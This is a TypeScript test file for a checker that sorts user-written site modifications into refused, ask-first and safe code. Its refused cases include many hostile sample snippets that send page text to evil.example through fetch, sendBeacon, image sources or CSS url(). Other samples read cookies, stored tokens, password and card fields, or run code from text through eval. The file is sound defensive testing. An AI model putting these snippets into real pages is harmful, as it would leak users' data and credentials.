import { readFileSync } from 'fs'
import { join } from 'path'
import { parse } from 'acorn'
import postcss from 'postcss'
import { describe, expect, it } from 'vitest'
import { X_QUICK_REPLY } from '../../main/browser-task/site-mods-x'
import { checkMod, modFingerprint, modHostTooBroad, type ModParsers } from '../site-mod-check'

const parsers: ModParsers = {
  parseJs: (code) => parse(code, { ecmaVersion: 'latest', sourceType: 'script', allowReturnOutsideFunction: true }),
  parseCss: (css) => postcss.parse(css)
}
const js = (code: string) => checkMod({ css: '', js: code }, parsers)
const css = (code: string) => checkMod({ css: code, js: '' }, parsers)

const REFUSED: Array<[string, string]> = [
  ['plain fetch', `fetch('https://evil.example/?d=' + document.title)`],
  ['fetch through window', `window.fetch('/x')`],
  ['fetch by quoted name', `window['fetch']('/x')`],
  ['fetch pulled out of an object', `const { fetch: go } = document.defaultView; go('/x')`],
  ['fetch off an event', `addEventListener('click', (e) => e.view.fetch('/x'))`],
  ['beacon', `navigator.sendBeacon('/x', document.body.innerText)`],
  ['picture with data in the address', `new Image().src = 'https://evil.example/?' + document.body.innerText`],
  ['picture element', `const i = document.createElement('img'); document.body.append(i)`],
  ['src on a page element', `document.querySelector('img').src = 'https://evil.example/' + document.title`],
  ['src by attribute', `document.querySelector('img').setAttribute('src', 'x' + document.title)`],
  ['script element', `document.body.append(document.createElement('script'))`],
  ['frame for fresh globals', `const f = document.createElement('iframe'); document.body.append(f); f.contentWindow.fetch('/x')`],
  ['existing frame', `document.querySelector('iframe').contentWindow`],
  ['raw html', `document.body.innerHTML = '<img src=x onerror=alert(1)>'`],
  ['raw html appended', `document.body.insertAdjacentHTML('beforeend', '<b>x</b>')`],
  ['inline handler', `document.body.setAttribute('onclick', 'alert(1)')`],
  ['handler as text', `document.body.onclick = 'alert(1)'`],
  ['eval', `eval('1')`],
  ['function from text', `new Function('return 1')()`],
  ['function through a constructor', `[].find.constructor('return 1')()`],
  ['timer with text', `setTimeout('alert(1)', 10)`],
  ['dynamic import', `import('https://evil.example/x.js')`],
  ['cookies', `const c = document.cookie`],
  ['saved site data', `localStorage.getItem('token')`],
  ['password fields', `document.querySelector('input[type=password]').value`],
  ['card fields', `document.querySelector('[autocomplete="cc-number"]')`],
  ['form submit', `document.forms[0].submit()`],
  ['leaves the page', `location.href = 'https://evil.example'`],
  ['leaves the page via window', `window.location = 'https://evil.example'`],
  ['opens a window', `window.open('https://evil.example')`],
  ['other windows', `top.document.title`],
  ['style with a web address', `document.body.style.background = 'url(https://evil.example/x.png)'`],
  ['our own bridge', `window.__mm.send('ask', 'x', 'y')`],
  ['clipboard', `navigator.clipboard.readText()`],
  ['location', `navigator.geolocation.getCurrentPosition(() => {})`],
  ['broken code', `const = 1`],
  ['a shadow elsewhere does not hide a navigation', `function g(location) {} location = 'https://evil.example/?' + document.title`],
  ['a shadow elsewhere does not hide fetch', `function g(fetch) {} fetch('/x')`],
  ['a shadow elsewhere does not hide window.top', `function g(top) {} window.top.document.title`],
  ['navigation through a destructuring target', `[location.href] = ['https://evil.example/?' + document.title]`],
  ['navigation through a for-of target', `for (location.href of ['https://evil.example/?' + document.title]);`],
  ['navigation through Object.assign', `Object.assign(location, { href: 'https://evil.example/?' + document.title })`],
  ['location kept in a variable', `const l = location; l.assign('https://evil.example/?' + document.title)`],
  ['location pulled out of window', `const { location: l } = window`],
  ['location method pulled out', `const { assign } = location; assign('/x')`],
  ['navigation api', `navigation.navigate('/x')`],
  ['meta refresh', `document.querySelector('meta').setAttribute('http-equiv', 'refresh')`],
  ['meta refresh by property', `document.querySelector('meta').httpEquiv = 'refresh'`],
  ['fetch later', `fetchLater('/x')`],
  ['font from text', `new FontFace('x', 'ur' + 'l(/x)')`],
  ['stylesheet from text', `new CSSStyleSheet().replaceSync(document.title)`],
  ['adopted sheet', `document.adoptedStyleSheets = []`],
  ['rule inserted', `document.styleSheets[0].insertRule(document.title)`],
  ['registered url property', `CSS.registerProperty({ name: '--x', syntax: '<url>', inherits: false, initialValue: document.title })`],
  ['worklet script', `CSS.paintWorklet.addModule('/x.js')`],
  ['sanitized html', `document.body.setHTML('<img src=x>')`],
  ['document.write through a variable', `const d = document; d.write('x')`],
  ['code nested too deep to read', 'a' + '.b'.repeat(20000)],
  ['a named frame is a window too', `window.myframe.fetch('/x')`],
  ['worker made from a frame window', `new window.myframe.Worker('/x')`],
  ['popup from a frame window', `const w = window.myframe; w.open('/x')`]
]

const ASKS: Array<[string, string]> = [
  ['name built from pieces', `const k = 'fe' + 'tch'; document.body[k]`],
  ['window by a built name', `const k = ['fe', 'tch'].join(''); window[k]('/x')`],
  ['window handed around', `const w = window; w.alert`],
  ['bare this', `(function () { return this })()`],
  ['hidden text', `const s = atob('ZmV0Y2g=')`],
  ['presses a button', `document.querySelector('button').click()`],
  ['types for you', `document.execCommand('insertText', false, 'hi')`],
  ['asks the AI', `mm.ask('write something')`],
  ['web address in text', `const a = document.createElement('a'); a.textContent = 'https://example.com'`],
  ['changes a link', `document.querySelector('a').href = '/elsewhere'`],
  ['reuses a browser name', `const parent = document.body; parent.append('x')`],
  ['timer with an unknown value', `const s = document.title; setTimeout(s, 10)`],
  ['link host rewritten', `document.querySelectorAll('a').forEach((a) => { a.hostname = 'x.example'; a.search = '?d=' + document.title })`],
  ['properties copied onto a page element', `Object.assign(document.body, { id: 'x' })`],
  ['property defined on a page element', `Object.defineProperty(document.body, 'id', { value: 'x' })`],
  ['key from a counter that is reassigned by for-of', `let i = 0; for (i of ['location']) document[i] = 1`],
  ['key from a counter that is reassigned by destructuring', `let i = 0; [i] = ['location']; document[i] = 1`],
  ['key from a counter that is also a parameter', `let i = 0; function f(i) { document[i] = 1 } f('location')`],
  ['key from a made-up length', `document[({ length: 'location' }).length] = 1`],
  ['method kept in a variable', `const make = document.createElement.bind(document)`],
  ['timer kept in a variable', `const t = setTimeout; t('x', 1)`],
  ['window name', `window.name = document.title`],
  ['meta content built at run time', `document.querySelector('meta').setAttribute('content', document.title)`],
  ['clipboard read', `navigator.clipboard.read()`]
]

const SAFE: Array<[string, string]> = [
  ['hide by observer', `new MutationObserver(() => { for (const el of document.querySelectorAll('[data-x]')) el.hidden = true }).observe(document.body, { childList: true, subtree: true })`],
  ['own button', `const b = document.createElement('button'); b.className = 'mm-mod-b'; b.textContent = 'Top'; b.addEventListener('click', () => scrollTo(0, 0)); document.body.append(b)`],
  ['loop over a list', `const list = [...document.querySelectorAll('p')]; for (let i = 0; i < list.length; i++) list[i].style.fontSize = '18px'`],
  ['reads sizes', `const r = document.body.getBoundingClientRect(); document.body.dataset.mmW = String(r.top + innerWidth)`],
  ['timer with a function', `setTimeout(() => document.body.classList.add('x'), 100)`],
  ['reads the address', `if (location.pathname.startsWith('/watch')) document.body.classList.add('w')`],
  ['reads address parts', `const { pathname, hostname } = location; document.title = pathname + hostname`],
  ['last item', `const l = [...document.querySelectorAll('p')]; l[l.length - 1].hidden = true`],
  ['a variable called name', `let name = 'a'; name = 'b'; document.body.dataset.n = name`],
  ['sizes in pixels', `const w = 10; document.body.style.width = w + 'px'`]
]

describe('checkMod', () => {
  it.each(REFUSED)('refuses: %s', (_name, code) => {
    expect(js(code).level).toBe('refuse')
  })

  it.each(ASKS)('asks first: %s', (_name, code) => {
    const v = js(code)
    expect(v.refused).toEqual([])
    expect(v.level).toBe('ask')
  })

  it.each(SAFE)('passes: %s', (_name, code) => {
    const v = js(code)
    expect([v.level, v.refused, v.asks]).toEqual(['safe', [], []])
  })

  it('look-only mods are safe and keep their styling', () => {
    const v = css(`ytd-rich-shelf-renderer[is-shorts] { display: none !important } @media (min-width: 900px) { #page { max-width: none !important } }`)
    expect([v.kind, v.level, v.cssRemoved]).toEqual(['look', 'safe', 0])
    expect(v.css).toContain('display: none')
  })

  it.each([
    ['web picture', `a { background: url(https://evil.example/x.png) }`],
    ['picture leak by typed value', `input[value^="a"] { background-image: url("//evil.example/a") }`],
    ['escaped url', `a { background: \\75 rl(https://evil.example/x) }`],
    ['image-set with a bare string', `a { background-image: image-set("https://evil.example/x" 1x) }`],
    ['import', `@import "https://evil.example/x.css"; a { color: red }`],
    ['web font', `@font-face { font-family: x; src: url(https://evil.example/f.woff) }`],
    ['web picture between two strings that look like a comment', `a::before { content: "/*" url(https://evil.example/x) "*/" }`],
    ['image-set between two strings that look like a comment', `a::before { content: "/*" image-set("https://evil.example/x" 1x) "*/" }`],
    ['escape ended by a windows newline', `a { background: \\75\r\nrl(https://evil.example/x) }`]
  ])('strips styling that loads from the web: %s', (_name, code) => {
    const v = css(code)
    expect(v.cssRemoved).toBeGreaterThan(0)
    expect(v.css).not.toMatch(/evil\.example/)
    expect(v.level).toBe('safe')
  })

  it('keeps a picture that is built into the styling', () => {
    const v = css(`a::before { content: ""; background: url("data:image/svg+xml,%3Csvg/%3E") }`)
    expect(v.cssRemoved).toBe(0)
  })

  it('the built-in X Quick reply is the shape that needs a yes, never a refusal of something it does not do', () => {
    const v = checkMod(X_QUICK_REPLY, parsers)
    expect(v.asks).toContain('presses buttons on the site for you')
    expect(v.refused).toEqual(['loads outside files'])
  })

  it('names a whole group of sites too broad to share a mod for', () => {
    for (const host of ['co.uk', 'com.au', 'github.io', 'www.vercel.app', 'pages.dev']) expect(modHostTooBroad(host)).toBe(true)
    for (const host of ['x.com', 'news.ycombinator.com', 'user.github.io', 'bbc.co.uk']) expect(modHostTooBroad(host)).toBe(false)
  })

  it('fingerprint changes with the code and not with the name', async () => {
    const a = await modFingerprint({ host: 'x.com', css: 'a{}', js: '' })
    expect(a).toMatch(/^[0-9a-f]{64}$/)
    expect(await modFingerprint({ host: 'x.com', css: 'a{}', js: '' })).toBe(a)
    expect(await modFingerprint({ host: 'x.com', css: 'b{}', js: '' })).not.toBe(a)
  })

  it('the cloud copy is the same file', () => {
    const root = join(__dirname, '..', '..', '..')
    expect(readFileSync(join(root, 'supabase/functions/_shared/site-mod-check.ts'), 'utf8')).toBe(
      readFileSync(join(root, 'src/shared/site-mod-check.ts'), 'utf8')
    )
  })
})
